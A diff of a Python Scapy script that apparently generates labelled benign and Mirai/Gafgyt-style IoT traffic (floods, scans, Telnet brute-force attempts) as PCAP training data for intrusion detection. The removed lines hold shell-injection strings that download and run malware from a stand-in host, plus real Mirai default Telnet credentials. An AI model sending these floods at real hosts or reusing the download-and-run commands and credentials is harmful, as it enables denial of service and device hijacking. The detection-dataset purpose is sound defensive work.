@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-IoT Network Traffic Simulator
-Generates realistic network packets for normal traffic, Mirai attacks, and other IoT malware patterns
+Enhanced IoT Network Traffic Simulator
+Generates realistic network packets for specific attack types and benign traffic
 using Scapy for federated learning training data.
 """
 
 import random
 import time
 import logging
+import os
 from datetime import datetime, timedelta
 from scapy.all import *
 from scapy.layers.inet import IP, TCP, UDP, ICMP
@@ -18,9 +19,22 @@ from typing import List, Dict, Tuple
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-class IoTTrafficSimulator:
+# Attack type mapping
+ATTACK_NAMES = {
+    0: "Benign",
+    1: "Gafgyt Combo",
+    2: "Gafgyt Junk",
+    3: "Gafgyt TCP",
+    5: "Mirai ACK",
+    6: "Mirai Scan",
+    7: "Mirai SYN",
+    8: "Mirai UDP",
+    9: "Mirai UDPPlain"
+}
+
+class EnhancedIoTTrafficSimulator:
     """
-    Comprehensive IoT network traffic simulator for generating realistic packets
+    Enhanced IoT network traffic simulator for generating specific attack patterns
     """
     
     def __init__(self):
@@ -32,62 +46,42 @@ class IoTTrafficSimulator:
             "172.16.0.0/24"
         ]
         
-        # Common IoT device types and their typical behaviors
+        # IoT device MAC address prefixes (real manufacturers)
+        self.iot_mac_prefixes = [
+            "00:1B:44",  # Netgear
+            "B8:27:EB",  # Raspberry Pi
+            "CC:32:E5",  # TP-Link
+            "00:17:88",  # Philips Hue
+            "18:B4:30",  # Nest
+            "F0:EF:86",  # D-Link
+            "00:90:A9",  # Western Digital
+        ]
+        
+        # Common IoT device profiles
         self.device_profiles = {
             'smart_camera': {
-                'ports': [80, 443, 554, 8080, 8181],  # HTTP, HTTPS, RTSP
+                'ports': [80, 443, 554, 8080, 8181, 1935],
                 'protocols': ['TCP', 'UDP'],
                 'packet_sizes': (64, 1500),
-                'traffic_pattern': 'continuous'
+                'services': ['http', 'rtsp', 'onvif']
             },
             'smart_bulb': {
-                'ports': [80, 443, 1883, 8883],  # HTTP, HTTPS, MQTT
+                'ports': [80, 443, 1883, 8883, 6667],
                 'protocols': ['TCP', 'UDP'],
                 'packet_sizes': (40, 200),
-                'traffic_pattern': 'periodic'
+                'services': ['http', 'mqtt', 'coap']
             },
             'router': {
-                'ports': [22, 23, 53, 80, 443, 8080],  # SSH, Telnet, DNS, HTTP
+                'ports': [22, 23, 53, 80, 443, 8080, 7547],
                 'protocols': ['TCP', 'UDP'],
                 'packet_sizes': (40, 1500),
-                'traffic_pattern': 'mixed'
+                'services': ['ssh', 'telnet', 'http', 'tr069']
             },
-            'smart_thermostat': {
-                'ports': [80, 443, 1883],
-                'protocols': ['TCP', 'UDP'],
-                'packet_sizes': (40, 300),
-                'traffic_pattern': 'periodic'
-            },
-            'baby_monitor': {
-                'ports': [80, 443, 554, 8080],
+            'dvr': {
+                'ports': [80, 8000, 8080, 37777, 34567],
                 'protocols': ['TCP', 'UDP'],
                 'packet_sizes': (100, 1400),
-                'traffic_pattern': 'continuous'
-            }
-        }
-        
-        # Attack patterns
-        self.attack_patterns = {
-            'mirai': {
-                'scan_ports': [23, 2323, 80, 8080, 443, 8443, 7547],
-                'flood_ports': [53, 80, 443],
-                'payload_sizes': (1, 1500),
-                'scan_rate': 'high',  # packets per second
-                'characteristics': 'telnet_brute_force'
-            },
-            'gafgyt': {
-                'scan_ports': [23, 22, 80, 8080, 2323],
-                'flood_ports': [80, 443],
-                'payload_sizes': (1, 1200),
-                'scan_rate': 'medium',
-                'characteristics': 'tcp_syn_flood'
-            },
-            'tsunami': {
-                'scan_ports': [22, 23, 80, 443],
-                'flood_ports': [80, 443, 53],
-                'payload_sizes': (50, 1000),
-                'scan_rate': 'variable',
-                'characteristics': 'udp_flood'
+                'services': ['http', 'proprietary']
             }
         }
 
@@ -96,7 +90,6 @@ class IoTTrafficSimulator:
         if not subnet:
             subnet = random.choice(self.iot_subnets)
         
-        # Extract base IP and generate device IP
         base_ip = subnet.split('/')[0].rsplit('.', 1)[0]
         device_id = random.randint(10, 254)
         return f"{base_ip}.{device_id}"
@@ -105,393 +98,406 @@ class IoTTrafficSimulator:
         """Generate external IP for internet traffic"""
         return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
-    def create_normal_traffic(self, num_packets: int = 1000, device_type: str = None) -> List[Packet]:
-        """
-        Generate normal IoT traffic patterns
-        """
+    def generate_mac_address(self) -> str:
+        """Generate realistic IoT device MAC address"""
+        prefix = random.choice(self.iot_mac_prefixes)
+        suffix = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
+        return f"{prefix}:{suffix}"
+
+    def create_benign_traffic(self, num_packets: int = 500) -> List[Packet]:
+        """Generate benign IoT traffic (Attack Type 0)"""
         packets = []
-        
-        if not device_type:
-            device_type = random.choice(list(self.device_profiles.keys()))
-        
-        profile = self.device_profiles[device_type]
-        logger.info(f"Generating {num_packets} normal packets for {device_type}")
+        logger.info(f"Generating {num_packets} benign packets")
         
         for i in range(num_packets):
-            # Source: IoT device, Destination: External server or local network
+            device_type = random.choice(list(self.device_profiles.keys()))
+            profile = self.device_profiles[device_type]
+            
             src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_external_ip() if random.random() < 0.7 else self.generate_iot_ip()
             
-            if random.random() < 0.3:  # 30% local traffic
-                dst_ip = self.generate_iot_ip()
-            else:  # 70% external traffic
-                dst_ip = self.generate_external_ip()
-            
-            # Select protocol and ports
             protocol = random.choice(profile['protocols'])
             src_port = random.randint(1024, 65535)
             dst_port = random.choice(profile['ports'])
             
-            # Create base packet
             if protocol == 'TCP':
-                packet = self._create_tcp_packet(src_ip, dst_ip, src_port, dst_port, 
-                                                profile['packet_sizes'])
-            else:  # UDP
-                packet = self._create_udp_packet(src_ip, dst_ip, src_port, dst_port, 
-                                                profile['packet_sizes'])
-            
-            packets.append(packet)
-            
-            # Add realistic timing
-            if profile['traffic_pattern'] == 'periodic':
-                time.sleep(random.uniform(0.1, 2.0))
-            elif profile['traffic_pattern'] == 'continuous':
-                time.sleep(random.uniform(0.01, 0.1))
-        
-        return packets
-
-    def create_mirai_attack(self, num_packets: int = 1000, attack_phase: str = 'scan') -> List[Packet]:
-        """
-        Generate Mirai botnet attack patterns
-        """
-        packets = []
-        logger.info(f"Generating {num_packets} Mirai {attack_phase} packets")
-        
-        if attack_phase == 'scan':
-            packets.extend(self._create_mirai_scan(num_packets))
-        elif attack_phase == 'infection':
-            packets.extend(self._create_mirai_infection(num_packets))
-        elif attack_phase == 'ddos':
-            packets.extend(self._create_mirai_ddos(num_packets))
-        else:
-            # Mixed attack
-            packets.extend(self._create_mirai_scan(num_packets // 3))
-            packets.extend(self._create_mirai_infection(num_packets // 3))
-            packets.extend(self._create_mirai_ddos(num_packets // 3))
-        
-        return packets
-
-    def _create_mirai_scan(self, num_packets: int) -> List[Packet]:
-        """Create Mirai scanning behavior - rapid port scanning"""
-        packets = []
-        scan_ports = self.attack_patterns['mirai']['scan_ports']
-        
-        for i in range(num_packets):
-            src_ip = self.generate_iot_ip()  # Infected device
-            dst_ip = self.generate_iot_ip()  # Target device
-            
-            # Rapid port scanning
-            dst_port = random.choice(scan_ports)
-            src_port = random.randint(1024, 65535)
-            
-            # Create TCP SYN packet (typical for port scanning)
-            packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-                sport=src_port, 
-                dport=dst_port, 
-                flags="S",  # SYN flag
-                seq=random.randint(1, 4294967295)
-            )
-            
-            # Add Mirai-specific characteristics
-            if dst_port in [23, 2323]:  # Telnet ports
-                # Add telnet brute force payload
-                telnet_payload = self._get_mirai_telnet_payload()
-                packet = packet / Raw(load=telnet_payload)
-            
-            packets.append(packet)
-        
-        return packets
-
-    def _create_mirai_infection(self, num_packets: int) -> List[Packet]:
-        """Create Mirai infection/propagation traffic"""
-        packets = []
-        
-        for i in range(num_packets):
-            src_ip = self.generate_iot_ip()  # Infected device
-            dst_ip = self.generate_iot_ip()  # Target device
-            
-            # Telnet brute force attempts
-            packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-                sport=random.randint(1024, 65535),
-                dport=23,  # Telnet
-                flags="PA",  # PUSH+ACK
-                seq=random.randint(1, 4294967295)
-            )
-            
-            # Add brute force payload
-            credentials = self._get_mirai_credentials()
-            packet = packet / Raw(load=credentials)
-            
-            packets.append(packet)
-        
-        return packets
-
-    def _create_mirai_ddos(self, num_packets: int) -> List[Packet]:
-        """Create Mirai DDoS attack traffic"""
-        packets = []
-        flood_ports = self.attack_patterns['mirai']['flood_ports']
-        
-        for i in range(num_packets):
-            src_ip = self.generate_iot_ip()  # Botnet member
-            dst_ip = self.generate_external_ip()  # DDoS target
-            
-            flood_type = random.choice(['syn_flood', 'udp_flood', 'http_flood'])
-            
-            if flood_type == 'syn_flood':
-                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-                    sport=random.randint(1024, 65535),
-                    dport=random.choice(flood_ports),
-                    flags="S",
-                    seq=random.randint(1, 4294967295)
+                # Normal TCP communication
+                packet = Ether(src=self.generate_mac_address()) / IP(src=src_ip, dst=dst_ip, ttl=random.randint(32, 128)) / TCP(
+                    sport=src_port,
+                    dport=dst_port,
+                    flags=random.choice(["PA", "A", "S", "SA", "FA"]),
+                    seq=random.randint(1, 4294967295),
+                    ack=random.randint(1, 4294967295),
+                    window=random.randint(1024, 65535)
                 )
-            elif flood_type == 'udp_flood':
-                packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
-                    sport=random.randint(1024, 65535),
-                    dport=random.choice(flood_ports)
-                ) / Raw(load="A" * random.randint(64, 1024))
-            else:  # HTTP flood
-                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-                    sport=random.randint(1024, 65535),
-                    dport=80,
-                    flags="PA"
-                ) / Raw(load=self._get_http_flood_payload())
+            else:  # UDP
+                packet = Ether(src=self.generate_mac_address()) / IP(src=src_ip, dst=dst_ip, ttl=random.randint(32, 128)) / UDP(
+                    sport=src_port,
+                    dport=dst_port
+                )
+            
+            # Add realistic payload
+            payload_size = random.randint(*profile['packet_sizes'])
+            if payload_size > 60:
+                payload = self._generate_benign_payload(dst_port, payload_size - 60)
+                packet = packet / Raw(load=payload)
             
             packets.append(packet)
         
         return packets
 
-    def create_gafgyt_attack(self, num_packets: int = 1000) -> List[Packet]:
-        """Generate Gafgyt (Bashlite) attack patterns"""
+    def create_gafgyt_combo(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Gafgyt Combo attack (Attack Type 1)"""
         packets = []
-        logger.info(f"Generating {num_packets} Gafgyt attack packets")
+        logger.info(f"Generating {num_packets} Gafgyt Combo attack packets")
         
         for i in range(num_packets):
             src_ip = self.generate_iot_ip()
-            dst_ip = self.generate_iot_ip() if random.random() < 0.5 else self.generate_external_ip()
+            dst_ip = self.generate_iot_ip() if random.random() < 0.6 else self.generate_external_ip()
             
-            attack_type = random.choice(['scan', 'exploit', 'ddos'])
+            attack_variant = random.choice(['tcp_syn', 'udp_flood', 'http_flood'])
             
-            if attack_type == 'scan':
-                # Similar to Mirai but different port preferences
-                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
+            if attack_variant == 'tcp_syn':
+                packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 64)) / TCP(
                     sport=random.randint(1024, 65535),
-                    dport=random.choice([22, 23, 80, 8080, 2323]),
-                    flags="S"
+                    dport=random.choice([80, 8080, 443, 23, 22]),
+                    flags="S",
+                    seq=random.randint(1, 4294967295),
+                    window=random.choice([1024, 2048, 4096, 8192])
                 )
-            elif attack_type == 'exploit':
-                # Shell command injection attempts
+            elif attack_variant == 'udp_flood':
+                packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 64)) / UDP(
+                    sport=random.randint(1024, 65535),
+                    dport=random.choice([53, 80, 443, 123])
+                ) / Raw(load=b"A" * random.randint(32, 512))
+            else:  # http_flood
                 packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                     sport=random.randint(1024, 65535),
                     dport=80,
                     flags="PA"
-                ) / Raw(load=self._get_gafgyt_exploit_payload())
-            else:  # DDoS
-                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-                    sport=random.randint(1024, 65535),
-                    dport=random.choice([80, 443]),
-                    flags="S"
-                )
+                ) / Raw(load=b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Gafgyt\r\n\r\n")
             
             packets.append(packet)
         
         return packets
 
-    def create_tsunami_attack(self, num_packets: int = 1000) -> List[Packet]:
-        """Generate Tsunami (Kaiten variant) attack patterns"""
+    def create_gafgyt_junk(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Gafgyt Junk attack (Attack Type 2)"""
         packets = []
-        logger.info(f"Generating {num_packets} Tsunami attack packets")
+        logger.info(f"Generating {num_packets} Gafgyt Junk attack packets")
         
         for i in range(num_packets):
             src_ip = self.generate_iot_ip()
             dst_ip = self.generate_external_ip()
             
-            # Tsunami typically uses UDP floods
-            packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
+            # Junk data flooding
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 32)) / UDP(
                 sport=random.randint(1024, 65535),
-                dport=random.choice([53, 80, 443])
-            ) / Raw(load="X" * random.randint(50, 1000))
+                dport=random.randint(1, 65535)
+            )
+            
+            # Random junk payload
+            junk_size = random.randint(100, 1400)
+            junk_data = bytes([random.randint(0, 255) for _ in range(junk_size)])
+            packet = packet / Raw(load=junk_data)
             
             packets.append(packet)
         
         return packets
 
-    def _create_tcp_packet(self, src_ip: str, dst_ip: str, src_port: int, 
-                          dst_port: int, size_range: Tuple[int, int]) -> Packet:
-        """Create a TCP packet with realistic characteristics"""
-        packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
-            sport=src_port,
-            dport=dst_port,
-            flags="PA",  # PUSH+ACK for data transfer
-            seq=random.randint(1, 4294967295),
-            ack=random.randint(1, 4294967295)
-        )
+    def create_gafgyt_tcp(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Gafgyt TCP attack (Attack Type 3)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Gafgyt TCP attack packets")
         
-        # Add realistic payload
-        payload_size = random.randint(size_range[0], size_range[1])
-        if payload_size > 40:  # Account for headers
-            payload = self._generate_realistic_payload(dst_port, payload_size - 40)
-            packet = packet / Raw(load=payload)
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_iot_ip() if random.random() < 0.5 else self.generate_external_ip()
+            
+            # TCP-specific Gafgyt attacks
+            attack_type = random.choice(['syn_flood', 'ack_flood', 'push_flood'])
+            
+            if attack_type == 'syn_flood':
+                flags = "S"
+                seq = random.randint(1, 4294967295)
+                ack = 0
+            elif attack_type == 'ack_flood':
+                flags = "A"
+                seq = random.randint(1, 4294967295)
+                ack = random.randint(1, 4294967295)
+            else:  # push_flood
+                flags = "PA"
+                seq = random.randint(1, 4294967295)
+                ack = random.randint(1, 4294967295)
+            
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 64)) / TCP(
+                sport=random.randint(1024, 65535),
+                dport=random.choice([80, 443, 8080, 23, 22, 25]),
+                flags=flags,
+                seq=seq,
+                ack=ack,
+                window=random.choice([0, 1024, 2048, 65535])
+            )
+            
+            if attack_type == 'push_flood':
+                packet = packet / Raw(load=b"X" * random.randint(10, 100))
+            
+            packets.append(packet)
         
-        return packet
+        return packets
 
-    def _create_udp_packet(self, src_ip: str, dst_ip: str, src_port: int, 
-                          dst_port: int, size_range: Tuple[int, int]) -> Packet:
-        """Create a UDP packet with realistic characteristics"""
-        packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
-            sport=src_port,
-            dport=dst_port
-        )
+    def create_mirai_ack(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Mirai ACK attack (Attack Type 5)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Mirai ACK attack packets")
         
-        # Add realistic payload
-        payload_size = random.randint(size_range[0], size_range[1])
-        if payload_size > 28:  # Account for headers
-            payload = self._generate_realistic_payload(dst_port, payload_size - 28)
-            packet = packet / Raw(load=payload)
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_external_ip()
+            
+            # Mirai ACK flooding
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(8, 64)) / TCP(
+                sport=random.randint(1024, 65535),
+                dport=random.choice([80, 443, 8080, 53, 22]),
+                flags="A",
+                seq=random.randint(1, 4294967295),
+                ack=random.randint(1, 4294967295),
+                window=random.choice([1024, 2048, 4096, 8192, 16384])
+            )
+            
+            # Sometimes add small payload
+            if random.random() < 0.3:
+                packet = packet / Raw(load=b"ACKFLOOD" * random.randint(1, 8))
+            
+            packets.append(packet)
         
-        return packet
+        return packets
 
-    def _generate_realistic_payload(self, port: int, size: int) -> bytes:
-        """Generate realistic payload based on port/protocol"""
-        if port == 80:  # HTTP
-            return self._get_http_payload()[:size]
-        elif port == 443:  # HTTPS (encrypted)
+    def create_mirai_scan(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Mirai Scan attack (Attack Type 6)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Mirai Scan attack packets")
+        
+        # Mirai scanning targets
+        scan_ports = [23, 2323, 80, 8080, 443, 8443, 7547, 5555, 9000]
+        
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_iot_ip()  # Scanning local network
+            
+            # Rapid port scanning
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(32, 128)) / TCP(
+                sport=random.randint(10000, 65535),
+                dport=random.choice(scan_ports),
+                flags="S",
+                seq=random.randint(1, 4294967295),
+                window=random.choice([1024, 2048, 4096, 5840, 8192])
+            )
+            
+            # Add telnet brute force indicators for telnet ports
+            if packet[TCP].dport in [23, 2323]:
+                if random.random() < 0.4:
+                    creds = random.choice([
+                        b"admin\r\nadmin\r\n", b"root\r\nroot\r\n", 
+                        b"user\r\nuser\r\n", b"admin\r\n123456\r\n"
+                    ])
+                    packet = packet / Raw(load=creds)
+            
+            packets.append(packet)
+        
+        return packets
+
+    def create_mirai_syn(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Mirai SYN attack (Attack Type 7)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Mirai SYN attack packets")
+        
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_external_ip()
+            
+            # SYN flood attack
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(8, 64)) / TCP(
+                sport=random.randint(1024, 65535),
+                dport=random.choice([80, 443, 8080, 53, 22, 25, 110, 995]),
+                flags="S",
+                seq=random.randint(1, 4294967295),
+                window=random.choice([1024, 2048, 4096, 5840, 8192, 16384])
+            )
+            
+            # Add TCP options typical of Mirai
+            if random.random() < 0.5:
+                packet[TCP].options = [('MSS', random.choice([536, 1460, 1440]))]
+            
+            packets.append(packet)
+        
+        return packets
+
+    def create_mirai_udp(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Mirai UDP attack (Attack Type 8)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Mirai UDP attack packets")
+        
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_external_ip()
+            
+            # UDP flood with various payloads
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(8, 64)) / UDP(
+                sport=random.randint(1024, 65535),
+                dport=random.choice([53, 123, 1900, 5060, 80, 443])
+            )
+            
+            # Different payload types
+            payload_type = random.choice(['dns', 'ntp', 'ssdp', 'generic'])
+            
+            if payload_type == 'dns':
+                # Fake DNS query
+                payload = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
+            elif payload_type == 'ntp':
+                # NTP request
+                payload = b'\x17\x00\x03\x2a' + b'\x00' * 44
+            elif payload_type == 'ssdp':
+                # SSDP M-SEARCH
+                payload = b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nST: upnp:rootdevice\r\nMX: 3\r\n\r\n'
+            else:
+                # Generic flood payload
+                payload = b'MIRAI_UDP_FLOOD_' + bytes([random.randint(65, 90) for _ in range(random.randint(50, 500))])
+            
+            packet = packet / Raw(load=payload)
+            packets.append(packet)
+        
+        return packets
+
+    def create_mirai_udp_plain(self, num_packets: int = 500) -> List[Packet]:
+        """Generate Mirai UDP Plain attack (Attack Type 9)"""
+        packets = []
+        logger.info(f"Generating {num_packets} Mirai UDP Plain attack packets")
+        
+        for i in range(num_packets):
+            src_ip = self.generate_iot_ip()
+            dst_ip = self.generate_external_ip()
+            
+            # Plain UDP flood with minimal payload
+            packet = Ether() / IP(src=src_ip, dst=dst_ip, ttl=random.randint(8, 64)) / UDP(
+                sport=random.randint(1024, 65535),
+                dport=random.choice([80, 443, 53, 123, 1194, 4789])
+            )
+            
+            # Simple repeating patterns
+            patterns = [
+                b'A' * random.randint(32, 128),
+                b'0' * random.randint(32, 128),
+                b'\x00' * random.randint(32, 128),
+                b'\xFF' * random.randint(32, 128),
+                b'FLOOD' * random.randint(10, 50)
+            ]
+            
+            payload = random.choice(patterns)
+            packet = packet / Raw(load=payload)
+            packets.append(packet)
+        
+        return packets
+
+    def _generate_benign_payload(self, port: int, size: int) -> bytes:
+        """Generate realistic benign payload based on port"""
+        if port == 80:
+            # HTTP request/response
+            payloads = [
+                b"GET /api/status HTTP/1.1\r\nHost: device.local\r\nUser-Agent: IoTDevice/1.0\r\n\r\n",
+                b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"ok\"}",
+                b"POST /config HTTP/1.1\r\nContent-Length: 50\r\n\r\n{\"setting\":\"value\"}"
+            ]
+            return random.choice(payloads)[:size]
+        elif port == 443:
+            # HTTPS (encrypted)
             return bytes([random.randint(0, 255) for _ in range(size)])
-        elif port == 53:  # DNS
-            return self._get_dns_payload()[:size]
-        elif port == 1883:  # MQTT
-            return self._get_mqtt_payload()[:size]
-        elif port == 554:  # RTSP
-            return self._get_rtsp_payload()[:size]
+        elif port == 53:
+            # DNS query/response
+            return b'\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00'[:size]
+        elif port == 1883:
+            # MQTT
+            return b'\x30\x12\x00\x04test{"temp":25.5}'[:size]
         else:
-            # Generic payload
-            return bytes([random.randint(32, 126) for _ in range(size)])
-
-    def _get_http_payload(self) -> bytes:
-        """Generate realistic HTTP request payload"""
-        methods = ["GET", "POST", "PUT", "HEAD"]
-        paths = ["/", "/index.html", "/api/data", "/config", "/status"]
-        method = random.choice(methods)
-        path = random.choice(paths)
-        
-        payload = f"{method} {path} HTTP/1.1\r\n"
-        payload += "Host: 192.168.1.1\r\n"
-        payload += "User-Agent: IoTDevice/1.0\r\n"
-        payload += "Accept: */*\r\n\r\n"
-        
-        return payload.encode()
-
-    def _get_dns_payload(self) -> bytes:
-        """Generate realistic DNS query payload"""
-        # Simplified DNS query structure
-        return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
-
-    def _get_mqtt_payload(self) -> bytes:
-        """Generate realistic MQTT payload"""
-        # Simplified MQTT message
-        return b'\x30\x1a\x00\x04test\x00\x10{"temp": 23.5}'
-
-    def _get_rtsp_payload(self) -> bytes:
-        """Generate realistic RTSP payload"""
-        return b'DESCRIBE rtsp://192.168.1.100/stream RTSP/1.0\r\nCSeq: 1\r\n\r\n'
-
-    def _get_mirai_telnet_payload(self) -> bytes:
-        """Get Mirai telnet brute force payload"""
-        usernames = [b"admin", b"root", b"user", b"guest"]
-        passwords = [b"admin", b"password", b"123456", b"default", b""]
-        
-        username = random.choice(usernames)
-        password = random.choice(passwords)
-        
-        return username + b"\r\n" + password + b"\r\n"
-
-    def _get_mirai_credentials(self) -> bytes:
-        """Get Mirai credential list for brute force"""
-        creds = [
-            b"root:xc3511", b"root:vizxv", b"root:admin", b"admin:admin",
-            b"root:888888", b"root:xmhdipc", b"root:default", b"root:juantech",
-            b"root:123456", b"root:54321"
-        ]
-        return random.choice(creds)
-
-    def _get_http_flood_payload(self) -> bytes:
-        """Get HTTP flood attack payload"""
-        return b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mirai\r\n\r\n"
-
-    def _get_gafgyt_exploit_payload(self) -> bytes:
-        """Get Gafgyt shell injection payload"""
-        commands = [
-            b"wget http://evil.com/bot; chmod +x bot; ./bot",
-            b"cd /tmp; rm -rf *; wget http://evil.com/gafgyt",
-            b"busybox wget http://evil.com/malware -O /tmp/malware",
-            b"curl -O http://evil.com/payload.sh; sh payload.sh"
-        ]
-        return random.choice(commands)
+            # Generic application data
+            return bytes([random.randint(32, 126) for _ in range(min(size, 100))])
 
     def save_packets_to_pcap(self, packets: List[Packet], filename: str):
         """Save generated packets to a PCAP file"""
         logger.info(f"Saving {len(packets)} packets to {filename}")
         wrpcap(filename, packets)
 
-    def generate_mixed_dataset(self, total_packets: int = 10000, 
-                             attack_ratio: float = 0.3) -> List[Packet]:
-        """
-        Generate a mixed dataset with normal and attack traffic
-        """
-        normal_count = int(total_packets * (1 - attack_ratio))
-        attack_count = total_packets - normal_count
+    def generate_all_attack_types(self, packets_per_type: int = 500):
+        """Generate all attack types and save to separate files"""
         
-        packets = []
+        # Create output directory
+        output_dir = "pcaps"
+        os.makedirs(output_dir, exist_ok=True)
         
-        # Generate normal traffic
-        packets.extend(self.create_normal_traffic(normal_count))
+        # Generate each attack type
+        attack_generators = {
+            0: self.create_benign_traffic,
+            1: self.create_gafgyt_combo,
+            2: self.create_gafgyt_junk,
+            3: self.create_gafgyt_tcp,
+            5: self.create_mirai_ack,
+            6: self.create_mirai_scan,
+            7: self.create_mirai_syn,
+            8: self.create_mirai_udp,
+            9: self.create_mirai_udp_plain
+        }
         
-        # Generate attack traffic (mixed)
-        mirai_count = attack_count // 3
-        gafgyt_count = attack_count // 3
-        tsunami_count = attack_count - mirai_count - gafgyt_count
+        all_packets = []
         
-        packets.extend(self.create_mirai_attack(mirai_count, 'mixed'))
-        packets.extend(self.create_gafgyt_attack(gafgyt_count))
-        packets.extend(self.create_tsunami_attack(tsunami_count))
+        for attack_id, generator_func in attack_generators.items():
+            attack_name = ATTACK_NAMES[attack_id]
+            print(f"Generating {packets_per_type} packets for {attack_name}...")
+            
+            packets = generator_func(packets_per_type)
+            
+            # Add attack label to each packet (as metadata)
+            for packet in packets:
+                packet.attack_label = attack_id
+            
+            # Save individual attack type
+            filename = f"{output_dir}/{attack_id:02d}_{attack_name.lower().replace(' ', '_')}.pcap"
+            self.save_packets_to_pcap(packets, filename)
+            
+            all_packets.extend(packets)
         
-        # Shuffle to mix packet types
-        random.shuffle(packets)
+        # Shuffle and save combined dataset
+        random.shuffle(all_packets)
+        self.save_packets_to_pcap(all_packets, f"{output_dir}/combined_iot_dataset.pcap")
         
-        return packets
+        return all_packets
 
 def main():
-    import os
+    print("Enhanced IoT Network Traffic Simulator")
+    print("=" * 50)
     
-    # Create output directory
-    output_dir = "samplePackets"
-    os.makedirs(output_dir, exist_ok=True)
+    simulator = EnhancedIoTTrafficSimulator()
     
-    simulator = IoTTrafficSimulator()
+    # Generate all attack types
+    packets_per_type = 500
+    print(f"Generating {packets_per_type} packets for each attack type...")
+    print(f"Total packets to generate: {len(ATTACK_NAMES) * packets_per_type}")
+    print()
     
-    print("Generating IoT network packets...")
+    start_time = time.time()
+    all_packets = simulator.generate_all_attack_types(packets_per_type)
+    end_time = time.time()
     
-    # Generate different types of traffic
-    print("1. Generating normal IoT traffic...")
-    normal_packets = simulator.create_normal_traffic(500)
-    simulator.save_packets_to_pcap(normal_packets, f"{output_dir}/normal_traffic.pcap")
+    print(f"\nGeneration completed in {end_time - start_time:.2f} seconds")
+    print(f"Total packets generated: {len(all_packets)}")
+    print("\nFiles generated:")
     
-    print("2. Generating Mirai attack packets...")
-    mirai_packets = simulator.create_mirai_attack(500, 'mixed')
-    simulator.save_packets_to_pcap(mirai_packets, f"{output_dir}/mirai_attack.pcap")
+    output_dir = "pcaps"
+    for attack_id, attack_name in ATTACK_NAMES.items():
+        filename = f"{attack_id:02d}_{attack_name.lower().replace(' ', '_')}.pcap"
+        print(f"- {output_dir}/{filename} ({packets_per_type} packets)")
     
-    print("3. Generating Gafgyt attack packets...")
-    gafgyt_packets = simulator.create_gafgyt_attack(500)
-    simulator.save_packets_to_pcap(gafgyt_packets, f"{output_dir}/gafgyt_attack.pcap")
-    
-    print("4. Generating mixed traffic dataset...")
-    mixed_packets = simulator.generate_mixed_dataset(500, 0.3)
-    simulator.save_packets_to_pcap(mixed_packets, f"{output_dir}/mixed_traffic.pcap")
-    
-    print(f"\nPacket generation complete!")
-    print(f"Files saved in {output_dir}/ folder:")
-    print("- normal_traffic.pcap (1000 packets)")
-    print("- mirai_attack.pcap (1000 packets)")
-    print("- gafgyt_attack.pcap (1000 packets)")
-    print("- mixed_traffic.pcap (5000 packets)")
+    print(f"- {output_dir}/combined_iot_dataset.pcap ({len(all_packets)} packets)")
+    print("\nDataset generation complete!")
 
 if __name__ == "__main__":
     main()
